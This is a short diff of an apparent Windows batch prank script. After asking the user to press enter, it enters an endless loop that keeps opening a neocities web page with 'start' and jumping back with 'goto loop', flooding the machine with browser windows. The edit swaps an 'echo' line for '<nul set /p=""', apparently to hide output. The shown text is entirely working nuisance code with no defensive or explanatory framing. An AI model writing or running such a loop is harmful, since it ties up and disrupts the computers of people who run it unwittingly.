@@ -9,6 +9,6 @@ pause
 echo Now... press enter again :)
 pause
 :loop
-echo 
+<nul set /p=""
 start https://uncleroscohascaughtyou.neocities.org/
 goto loop
